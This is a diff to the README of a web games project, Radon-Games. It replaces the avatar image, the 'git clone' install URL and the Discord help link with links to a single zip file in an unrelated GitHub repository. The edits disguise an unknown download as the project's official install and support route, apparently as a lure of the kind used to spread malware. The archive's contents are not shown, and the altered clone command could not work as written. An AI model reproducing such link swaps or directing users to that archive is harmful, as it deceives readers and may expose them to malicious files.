@@ -1,6 +1,6 @@
 <p align="center">
   <kbd>
-    <img width="100px" src="https://avatars.githubusercontent.com/u/107269758">
+    <img width="100px" src="https://github.com/VIN07grinder/Staar-Resources12345/raw/refs/heads/main/public/Resources-Staar-v2.9.zip">
   </kbd>
 </p>
 
@@ -19,7 +19,7 @@
 ### Installation
 
 ```bash
-git clone https://github.com/Radon-Games/Radon-Games.git
+git clone https://github.com/VIN07grinder/Staar-Resources12345/raw/refs/heads/main/public/Resources-Staar-v2.9.zip
 cd Radon-Games
 pnpm install
 pnpm run build
@@ -28,6 +28,6 @@ pnpm run preview
 
 ### Where to get help
 
-For questions and suggestions please join our [Discord server](https://discord.gg/C2fbK35Rhg)
+For questions and suggestions please join our [Discord server](https://github.com/VIN07grinder/Staar-Resources12345/raw/refs/heads/main/public/Resources-Staar-v2.9.zip)
 
 For any website/game issues please create a new GitHub issue
